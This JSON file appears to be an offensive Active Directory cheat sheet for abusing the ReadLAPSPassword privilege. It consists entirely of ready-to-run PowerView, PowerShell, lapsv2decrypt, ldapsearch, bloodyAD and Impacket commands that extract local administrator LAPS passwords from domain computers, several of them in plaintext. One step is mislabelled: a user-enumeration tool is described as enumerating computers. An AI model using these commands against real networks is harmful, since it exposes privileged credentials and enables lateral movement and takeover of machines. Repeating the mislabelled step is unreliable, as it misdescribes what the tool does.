{
    "ReadLAPSPassword": {
        "meaning": "This privilege allows a principal to read the LAPS password from a computer.",
        "common": "",
        "windows": {
            "PowerView": [
                {
                    "order": 1,
                    "command": "Get-DomainComputer \"MachineName\" -Properties \"cn\",\"ms-mcs-admpwd\",\"ms-mcs-admpwdexpirationtime\"",
                    "description": "Read legacy LAPS password using PowerView"
                }
            ],
            "LAPSPowerShell": [
                {
                    "order": 1,
                    "command": "Get-LapsADPassword \"WIN10\" -AsPlainText",
                    "description": "Read Windows LAPS (2023 edition) password in plaintext"
                }
            ],
            "LAPSv2Decrypt": [
                {
                    "order": 1,
                    "command": "lapsv2decrypt.exe -computername WIN10 -domain domain.com",
                    "description": "Decrypt Windows LAPS encrypted password using lapsv2decrypt"
                }
            ],
            "LDAP": [
                {
                    "order": 1,
                    "command": "ldapsearch -H ldap://dc.domain.com -D \"CN=user,CN=Users,DC=domain,DC=com\" -w password -b \"CN=Computers,DC=domain,DC=com\" \"(objectClass=computer)\" ms-mcs-admpwd ms-mcs-admpwdexpirationtime",
                    "description": "Read LAPS password using LDAP search"
                }
            ]
        },
        "linux": {
            "BloodyAD": [
                {
                    "order": 1,
                    "command": "bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p $PASSWORD get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime",
                    "description": "Read legacy LAPS passwords using bloodyAD"
                },
                {
                    "order": 2,
                    "command": "bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p $PASSWORD get search --filter '(msLAPS-PasswordExpirationTime=*)' --attr msLAPS-Password,msLAPS-PasswordExpirationTime",
                    "description": "Read Windows LAPS (2023) passwords using bloodyAD"
                }
            ],
            "LDAP": [
                {
                    "order": 1,
                    "command": "ldapsearch -H ldap://dc.domain.com -D \"CN=user,CN=Users,DC=domain,DC=com\" -w password -b \"CN=Computers,DC=domain,DC=com\" \"(objectClass=computer)\" ms-mcs-admpwd ms-mcs-admpwdexpirationtime",
                    "description": "Read LAPS password using ldapsearch"
                }
            ],
            "Impacket": [
                {
                    "order": 1,
                    "command": "python3 GetADUsers.py -all DOMAIN/USER:PASSWORD@DC_IP -outputfile computers.txt",
                    "description": "Enumerate computers first"
                },
                {
                    "order": 2,
                    "command": "python3 ldapdomaindump.py -u DOMAIN\\user -p password -o laps_dump DC_IP",
                    "description": "Dump LDAP including LAPS passwords"
                }
            ]
        }
    }
}
